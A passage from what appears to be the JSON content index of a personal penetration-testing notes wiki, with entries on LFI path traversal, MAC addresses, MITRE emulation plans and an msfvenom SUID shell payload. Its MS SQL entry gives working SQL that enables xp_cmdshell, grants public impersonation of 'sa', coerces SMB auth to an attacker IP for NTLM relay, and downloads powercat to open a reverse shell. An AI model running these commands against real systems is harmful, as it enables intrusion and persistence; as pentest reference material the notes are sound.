style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; elf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;         -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; shell.elf&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Avoid-dropping-privileges-with-SUID-Bash&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Avoid-dropping-privileges-with-SUID-Bash&quot;&gt;Remember that the -p flag is required to keep Bash from dropping privileges!&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/Local-file-inclusion-attacks":{"slug":"spells/Local-file-inclusion-attacks","filePath":"spells/Local file inclusion attacks.md","title":"Local file inclusion (LFI) attacks","links":["spells/PHP-local-file-inclusion-attacks"],"tags":["AttackCycle/Exploitation/LocalFileInclusion","Language/PHP"],"content":"LFI vulnerabilities are most common in PHP, but are sometimes found in other languages/frameworks.\nSince web servers are typically serving content from /var/www, /var/www/srv, or an immediate subdirectory for virtual hosts, you generally need to use ../../, ../../../, or ../../../../ to reach /.\nPHP tricks\nTransclude of PHP-local-file-inclusion-attacks","richContent":"&lt;p&gt;LFI vulnerabilities are &lt;em&gt;most&lt;/em&gt; common in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP-local-file-inclusion-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP-local-file-inclusion-attacks&quot;&gt;PHP&lt;/a&gt;, but are sometimes found in other languages/frameworks.&lt;/p&gt;\n&lt;p&gt;Since web servers are typically serving content from /var/www, /var/www/srv, or an immediate subdirectory for virtual hosts, you generally need to use ../../, ../../../, or ../../../../ to reach /.&lt;/p&gt;\n&lt;h2 id=&quot;php-tricks&quot;&gt;PHP tricks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#php-tricks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;PHP-local-file-inclusion-attacks&quot; data-block=&quot;&quot; data-embed-alias=&quot;PHP local file inclusion attacks&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP-local-file-inclusion-attacks&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/PHP-local-file-inclusion-attacks&quot;&gt;Transclude of PHP-local-file-inclusion-attacks&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Look-up-unicode-symbols-and-emojis":{"slug":"spells/Look-up-unicode-symbols-and-emojis","filePath":"spells/Look up unicode symbols and emojis.md","title":"Look up unicode symbols and emojis","links":[],"tags":["HowTo"],"content":"\nEmojipedia\nUnicode Character Table\n\nUnicode Arrows\nUnicode Superscripts and Subscripts\n\n\n","richContent":"&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;https://emojipedia.org&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Emojipedia&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://unicode-table.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Unicode Character Table&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;https://unicode-table.com/sets/arrow-symbols/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Unicode Arrows&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://unicode-table.com/sets/superscript-and-subscript-numbers/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Unicode Superscripts and Subscripts&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;"},"spells/MAC-address":{"slug":"spells/MAC-address","filePath":"spells/MAC address.md","title":"MAC address","links":["spells/Wi-Fi"],"tags":["Hardware/MACAddress","Protocol/WiFi"],"content":"MAC (“Media Access Control”) are unique 48-bit identifying numbers burned into network cards. They are typically represented as six octets each composed of two hexadecimal numbers (0 – f). The first three octets designate the network interface vendor while the last three constitute device serial number. On most operating systems octets are separated using colons, but Windows uses dashes instead.\n\nUNIX-style MAC address — a4:c3:f0:85:ac:2d\nVendor ID — a4:c3:f0\nNIC ID — 85:ac:2d\nWindows version of the same MAC address — A4-C3-F0-85-AC-2D\n\nSome network cards and operating systems allow MAC addresses to be overridden (for example, this is used for Wi-Fi privacy, and can be done explicitly on UNIX systems using the macchanger tool).","richContent":"&lt;p&gt;MAC (“Media Access Control”) are unique 48-bit identifying numbers burned into network cards. They are typically represented as six octets each composed of two hexadecimal numbers (0 – f). The first three octets designate the network interface vendor while the last three constitute device serial number. On most operating systems octets are separated using colons, but Windows uses dashes instead.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;UNIX-style MAC address — a4:c3:f0:85:ac:2d&lt;/li&gt;\n&lt;li&gt;Vendor ID — a4:c3:f0&lt;/li&gt;\n&lt;li&gt;NIC ID — 85:ac:2d&lt;/li&gt;\n&lt;li&gt;Windows version of the same MAC address — A4-C3-F0-85-AC-2D&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Some network cards and operating systems allow MAC addresses to be overridden (for example, this is used for &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Wi-Fi&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Wi-Fi&quot;&gt;Wi-Fi&lt;/a&gt; privacy, and can be done explicitly on UNIX systems using the macchanger tool).&lt;/p&gt;"},"spells/MITRE-ATTaCK-emulation-plans":{"slug":"spells/MITRE-ATTaCK-emulation-plans","filePath":"spells/MITRE ATTaCK emulation plans.md","title":"MITRE ATT&CK emulation plans","links":[],"tags":["Standard/MITRE/Emulation"],"content":"MITRE ATT&amp;CK APT emulation plans are a little hard to find. Direct links to some common ones:\n\nAPT3\nFIN6\nAPT29\nmenuPass\nCarbanak Group\nFIN7\n","richContent":"&lt;p&gt;MITRE ATT&amp;#x26;CK APT emulation plans are a little hard to find. Direct links to some common ones:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;https://attack.mitre.org/resources/adversary-emulation-plans/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;APT3&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin6&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;FIN6&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;APT29&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/menuPass&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;menuPass&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/carbanak&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Carbanak Group&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;FIN7&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;"},"spells/MS-SQL":{"slug":"spells/MS-SQL","filePath":"spells/MS SQL.md","title":"MS SQL","links":["spells/Metasploit-MS-SQL-modules","spells/Powercat","spells/netcat"],"tags":["Application/MSSQL","OS/Windows","Application/PowerShell/Powercat","Application/netcat","AttackCycle/PrivEsc"],"content":"Useful Metasploit modules\nTransclude of Metasploit-MS-SQL-modules\nxp_cmdshell\nMS SQL includes the xp_cmdshell “extended” procedure, which allows a shell command to be called. This is disabled by default, but if enabled it can be used in a trigger to provide persistence on database activity. Powercat, a re-implementation of netcat in pure PowerShell, is useful here.\n-- Enable MS SQL &quot;advanced options&quot;\n--\nsp_configure &#039;Show Advanced Options&#039;,1;\nRECONFIGURE;\n \n-- Enable xp_cmdshell stored procedure\n--\nsp_configure &#039;xp_cmdshell&#039;,1;\nRECONFIGURE;\n \n--- OPTIONAL: Allow all users to impersonate the &quot;sa&quot; (database\n--- administrator) user (this enables low-privilege website users\n--- to run xp_cmdshell)\n---\nUSE master;\nGRANT impersonate ON login::sa TO [public];\n \n-- Coerce MS SQL to connecting using SMB to an attacker at\n-- 1.2.3.4. Useful for NTLM relay attacks (if SMB signing isn&#039;t\n-- turned on, that is).\n--\nEXEC master.sys.xp_dirtree &#039;\\\\1.2.3.4\\share&#039;,1,1;\n \n-- Download an execute Powercat from an attacker at 1.2.3.4\n-- (using the built-in Python web server) and connect back to\n-- that IP on port 1337. Note that this in general should be\n-- caught by IDS/IDP systems, including Defender... But I&#039;ve\n-- actually had it work for me out-of-the-box a surprising\n-- number of times.\n--\nEXEC master.sys.xp_cmdshell &#039;powershell.exe -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#039;&#039;http://1.2.3.4:8000/powercat.ps1&#039;&#039;); powercat -c 1.2.3.4 -p 1337 -e cmd.exe&quot;&#039;","richContent":"&lt;h2 id=&quot;useful-metasploit-modules&quot;&gt;Useful Metasploit modules&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#useful-metasploit-modules&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Metasploit-MS-SQL-modules&quot; data-block=&quot;&quot; data-embed-alias=&quot;spells/Metasploit MS SQL modules&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Metasploit-MS-SQL-modules&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Metasploit-MS-SQL-modules&quot;&gt;Transclude of Metasploit-MS-SQL-modules&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;xp_cmdshell&quot;&gt;xp_cmdshell&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#xp_cmdshell&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;MS SQL includes the &lt;code&gt;xp_cmdshell&lt;/code&gt; “extended” procedure, which allows a shell command to be called. This is disabled by default, but if enabled it can be used in a trigger to provide persistence on database activity. &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Powercat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Powercat&quot;&gt;Powercat&lt;/a&gt;, a re-implementation of &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; in pure PowerShell, is useful here.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- Enable MS SQL &quot;advanced options&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;--&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;sp_configure &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Show Advanced Options&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;RECONFIGURE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- Enable xp_cmdshell stored procedure&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;--&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;sp_configure &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;xp_cmdshell&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;RECONFIGURE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;--- OPTIONAL: Allow all users to impersonate the &quot;sa&quot; (database&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;--- administrator) user (this enables low-privilege website users&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;--- to run xp_cmdshell)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;---&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;USE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; master&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;GRANT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; impersonate &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ON&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; login&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;::sa &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;TO&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; [public];&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- Coerce MS SQL to connecting using SMB to an attacker at&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- 1.2.3.4. Useful for NTLM relay attacks (if SMB signing isn&#039;t&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- turned on, that is).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;--&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;EXEC&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; master&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;sys&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.xp_dirtree &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\\\\1.2.3.4\\share&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- Download an execute Powercat from an attacker at 1.2.3.4&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- (using the built-in Python web server) and connect back to&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- that IP on port 1337. Note that this in general should be&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- caught by IDS/IDP systems, including Defender... But I&#039;ve&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- actually had it work for me out-of-the-box a surprising&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;-- number of times.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;--&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;EXEC&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; master&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;sys&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.xp_cmdshell &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;powershell.exe -c &quot;IEX(New-Object 